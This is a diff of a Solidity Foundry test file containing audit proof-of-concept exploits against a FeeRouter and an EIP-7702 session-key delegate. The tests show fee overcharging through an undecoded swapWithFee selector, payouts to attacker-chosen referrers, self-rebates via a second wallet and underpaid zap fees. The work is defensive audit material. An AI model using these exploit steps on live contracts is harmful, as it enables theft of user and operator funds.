@@ -33,20 +33,21 @@ contract MockRouterC {
     }
 }
 
-/**
- * A2 — access-control re-audit PoCs against the POST-FIX source.
- */
+/// Agent-2 (access control) re-audit PoCs — run against the CURRENT on-disk
+/// contracts/src, including the isReferrer attestation added mid-audit.
 contract ZZA2 is Test {
-    // --- shared ---
     MockERC20c tin;
     MockERC20c tout;
     MockRouterC router;
     FeeRouter fr;
+    SessionKeyDelegate delegate; // acts as the EIP-7702 account itself
 
-    // --- delegate side ---
-    SessionKeyDelegate delegate; // acts as the 7702 account itself
     address sessionKey = address(0x5E5510);
     address attacker = address(0xA77ACC);
+    address operator = address(0xFEE);
+    address user = address(0xBEEF);
+    address realReferrer = address(0xF00D); // an honest, owner-attested referrer
+    address freeloader = address(0xF4EE); // a trader with NO referrer at all
 
     bytes4 constant SEL_TRANSFER = bytes4(keccak256("transfer(address,uint256)"));
     bytes4 constant SEL_APPROVE = bytes4(keccak256("approve(address,uint256)"));
@@ -54,18 +55,18 @@ contract ZZA2 is Test {
     bytes4 constant SEL_SWAP_WITH_FEE =
         bytes4(keccak256("swapWithFee(uint256,uint256,(address,address,bool,address)[],uint256,address,uint16,uint16)"));
 
-    address operator = address(0xFEE);
-    address user = address(0xBEEF);
-
     function setUp() public {
         tin = new MockERC20c();
         tout = new MockERC20c();
         router = new MockRouterC(tout);
-        fr = new FeeRouter(address(router), operator, 50, 3000); // feeBps=50, maxRefShare=30%
+        fr = new FeeRouter(address(router), operator, 50, 3000); // feeBps=50, referred=45, maxShare=30%
         delegate = new SessionKeyDelegate();
         tin.mint(address(delegate), 1_000e18);
         tin.mint(user, 1_000e18);
+        tin.mint(freeloader, 1_000e18);
         vm.prank(user);
+        tin.approve(address(fr), type(uint256).max);
+        vm.prank(freeloader);
         tin.approve(address(fr), type(uint256).max);
     }
 
@@ -74,32 +75,32 @@ contract ZZA2 is Test {
         r[0] = Route({from: address(tin), to: address(tout), stable: false, factory: address(0xFAC)});
     }
 
-    // ─────────────────────────────────────────────────────────────────────────
-    // PoC 1 — SessionKeyDelegate: the new swap-recipient decode enumerates only
-    // the 3 Router selectors and misses `swapWithFee`, which the repo grants and
-    // which carries an attacker-chosen PAYEE (`referrer`) in its calldata.
-    // ─────────────────────────────────────────────────────────────────────────
+    function _attest(address who) internal {
+        address[] memory a = new address[](1);
+        a[0] = who;
+        fr.setReferrers(a, true); // deployer == owner
+    }
+
+    // ── F1: delegate — swapWithFee is not in the decoded swap set ────────────
+
     function _installRealWorldScope() internal {
         SessionKeyDelegate.TargetPolicy[] memory p = new SessionKeyDelegate.TargetPolicy[](2);
-
         bytes4[] memory frSels = new bytes4[](1);
         frSels[0] = SEL_SWAP_WITH_FEE;
         p[0] = SessionKeyDelegate.TargetPolicy({
             target: address(fr), selectors: frSels, tokenPerTxCap: 0, tokenDailyCap: 0
         });
-
         bytes4[] memory tokSels = new bytes4[](2);
         tokSels[0] = SEL_APPROVE;
         tokSels[1] = SEL_TRANSFER;
         p[1] = SessionKeyDelegate.TargetPolicy({
             target: address(tin), selectors: tokSels, tokenPerTxCap: 100e18, tokenDailyCap: 150e18
         });
-
         vm.prank(address(delegate));
         delegate.registerSession(sessionKey, uint48(block.timestamp + 30 days), 1 ether, 2 ether, p);
     }
 
-    /// The guard that SHOULD stop a payout to a non-target: it works for transfer().
+    /// The guard that SHOULD stop a payout to a non-target — it works for transfer().
     function test_A_directTransferToAttackerIsBlocked() public {
         _installRealWorldScope();
         vm.prank(sessionKey);
@@ -107,80 +108,106 @@ contract ZZA2 is Test {
         delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_TRANSFER, attacker, 1e18));
     }
 
-    /// ...and the identical payout goes through via swapWithFee's `referrer`.
-    function test_B_swapWithFeeReferrerPaysArbitraryAddress() public {
+    /// ...and swapWithFee walks straight past it: 4x fee overcharge, unmetered,
+    /// plus a payout to a non-allowlisted address as soon as any referrer exists.
+    function test_B_swapWithFeeIsUndecoded() public {
+        _attest(attacker); // steady state: the operator attests referrers
         _installRealWorldScope();
 
-        // approve is decoded + capped (100e18 per tx) — this is the ONLY metering.
         vm.prank(sessionKey);
         delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_APPROVE, address(fr), 100e18));
-
         uint256 ringBefore = delegate.tokenUsage(sessionKey, address(fr));
-        assertEq(attacker.balance, 0);
-        assertEq(tin.balanceOf(attacker), 0, "attacker starts empty");
 
-        // Compromised key: max fee override (200 = 2%), max referral share, payee = attacker.
         vm.prank(sessionKey);
         delegate.execute(
-            address(fr),
-            0,
+            address(fr), 0,
             abi.encodeWithSelector(
                 SEL_SWAP_WITH_FEE,
                 uint256(100e18), uint256(0), _routes(), block.timestamp + 600,
-                attacker, uint16(10_000), uint16(200)
+                attacker, uint16(10_000), uint16(200) // MAX_OVERRIDE_BPS
             )
         );
 
-        // fee = 100e18 * 200 / 10_000 = 2e18 ; referrer share = 30% = 0.6e18
-        assertEq(tin.balanceOf(attacker), 0.6e18, "arbitrary non-target address was paid");
-        // The user's fee was silently DOUBLED from the 50 bps headline to 200 bps.
-        assertEq(tin.balanceOf(operator), 1.4e18, "user charged 2% instead of 0.5%");
-        // Nothing was charged to any ring for the FeeRouter call itself.
-        assertEq(delegate.tokenUsage(sessionKey, address(fr)), ringBefore, "no metering on the swapWithFee call");
+        // fee = 2% of 100e18 = 2e18 (headline is 0.5% = 0.5e18) -> 4x overcharge.
+        assertEq(tin.balanceOf(attacker), 0.6e18, "30% of the inflated fee -> non-allowlisted address");
+        assertEq(tin.balanceOf(operator), 1.4e18, "user charged 200 bps, not 50");
+        assertEq(delegate.tokenUsage(sessionKey, address(fr)), ringBefore, "nothing metered for the call");
     }
 
-    // ─────────────────────────────────────────────────────────────────────────
-    // PoC 2 — FeeRouter.setConfig ratchets referredFeeBps DOWN and never back up,
-    // so restoring the headline rate after a promo leaves a permanently stale
-    // discount FLOOR that any caller can claim by naming any address.
-    // ─────────────────────────────────────────────────────────────────────────
-    function test_C_setConfigRatchetsDiscountFloorDownForever() public {
-        FeeRouter f2 = new FeeRouter(address(router), operator, 100, 3000); // 1% headline
-        assertEq(f2.referredFeeBps(), 90, "constructor: 90 bps discount");
-
-        f2.setConfig(operator, 10, 3000); // promo week: drop to 0.1%
-        assertEq(f2.referredFeeBps(), 10, "clamped down with the headline");
-
-        f2.setConfig(operator, 100, 3000); // promo over: restore 1%
-        assertEq(f2.feeBps(), 100, "headline restored");
-        assertEq(f2.referredFeeBps(), 10, "discount floor STAYS at 10 bps");
-
-        // Any caller now pays 10 bps by naming ANY address as referrer.
-        vm.prank(user);
-        tin.approve(address(f2), type(uint256).max);
-        vm.prank(user);
-        f2.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0xDEAD), 0, 10);
-
-        assertEq(tin.balanceOf(operator), 0.1e18, "operator got 10 bps, not 100 bps");
-        // Honest caller with no referrer still cannot underpay:
-        vm.prank(user);
-        vm.expectRevert(FeeRouter.FeeTooHigh.selector);
-        f2.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 10);
+    /// Even with NO referrer attested, the key still forces the 4x overcharge.
+    function test_B2_feeOverrideUnconstrainedWithoutAnyReferrer() public {
+        _installRealWorldScope();
+        vm.prank(sessionKey);
+        delegate.execute(address(tin), 0, abi.encodeWithSelector(SEL_APPROVE, address(fr), 100e18));
+        vm.prank(sessionKey);
+        delegate.execute(
+            address(fr), 0,
+            abi.encodeWithSelector(
+                SEL_SWAP_WITH_FEE,
+                uint256(100e18), uint256(0), _routes(), block.timestamp + 600,
+                address(0), uint16(0), uint16(200)
+            )
+        );
+        assertEq(tin.balanceOf(operator), 2e18, "200 bps charged where the policy advertises 50");
     }
 
-    // ─────────────────────────────────────────────────────────────────────────
-    // PoC 3 — the two-sided floor's LOWER bound is feeBps, but the zap leg's
-    // correct rate is 2x feeBps, so every zap can be underpaid by 50%.
-    // ─────────────────────────────────────────────────────────────────────────
-    function test_D_zapHalfLegUnderpaidFiftyPercent() public {
-        // src/surfaces/zap.ts: zapFeeBpsOverride = min(effBps * 2, 200) = 100.
+    // ── F2: isReferrer has no writer in the repo -> program is inert ─────────
+
+    /// A genuinely referred trade (referrer recorded off-chain) is charged the
+    /// FULL rate and the referrer is paid NOTHING, because nothing ever calls
+    /// setReferrers. swapBuilder still ledgers a 30% referral payout.
+    function test_C_unattestedReferralSilentlyOvercharges() public {
+        vm.prank(user);
+        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, realReferrer, 3000, 0);
+        assertEq(tin.balanceOf(operator), 0.5e18, "charged 50 bps, quote said 45");
+        assertEq(tin.balanceOf(realReferrer), 0, "referrer paid nothing, ledger credits 30%");
+    }
+
+    // ── F3: isReferrer is a global flag, not a trader->referrer binding ──────
+
+    function test_D_anyTraderCanClaimAnyAttestedReferrer() public {
+        _attest(realReferrer); // honest referrer, publicly visible via isReferrer()
+
+        // A trader with no referral relationship whatsoever names them.
+        vm.prank(freeloader);
+        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, realReferrer, 10_000, 0);
+
+        // fee = 45 bps (discount unlocked), 30% diverted.
+        assertEq(tin.balanceOf(realReferrer), 0.135e18, "share diverted on an unrelated trade");
+        assertEq(tin.balanceOf(operator), 0.315e18, "operator keeps 31.5 bps vs the 50 bps owed");
+        assertEq(((0.5e18 - uint256(0.315e18)) * 100) / 0.5e18, 37, "37% operator revenue loss");
+    }
+
+    /// `referrer != msg.sender` is defeated by one extra wallet: the attacker
+    /// gets themselves attested (the program attests anyone who refers), then
+    /// trades from a second address naming their own attested wallet.
+    function test_E_selfRebateViaSecondWallet() public {
+        _attest(attacker);
+        vm.prank(freeloader); // freeloader and attacker are the same person
+        fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, attacker, 10_000, 0);
+        assertEq(tin.balanceOf(attacker), 0.135e18, "rebated to a wallet the trader controls");
+    }
+
+    // ── F4: the floor cannot express the zap half-leg rate ───────────────────
+
+    function test_F_zapHalfLegUnderpaidFiftyPercent() public {
+        // src/surfaces/zap.ts sends zapFeeBpsOverride = min(effBps*2, 200) = 100.
         vm.prank(user);
         fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 100);
         assertEq(tin.balanceOf(operator), 1e18, "intended zap fee on the half-leg");
 
-        // Same call with the plain-swap rate passes the floor (50 >= feeBps 50).
+        // The plain-swap rate clears the floor (50 >= feeBps 50) -> half the fee.
         vm.prank(user);
         fr.swapWithFee(100e18, 0, _routes(), block.timestamp + 600, address(0), 0, 50);
-        assertEq(tin.balanceOf(operator), 1e18 + 0.5e18, "only half the zap fee collected");
+        assertEq(tin.balanceOf(operator), 1.5e18, "only half the zap fee collected");
+    }
+
+    // ── LEAD: setConfig clobbers a custom referredFeeBps ─────────────────────
+
+    function test_G_setConfigClobbersCustomDiscount() public {
+        fr.setReferredFeeBps(20); // owner deliberately sets a 20 bps referred rate
+        assertEq(fr.referredFeeBps(), 20);
+        fr.setConfig(address(0xFEE2), 50, 3000); // change ONLY the fee recipient
+        assertEq(fr.referredFeeBps(), 45, "silently re-derived to 90% of headline");
     }
 }
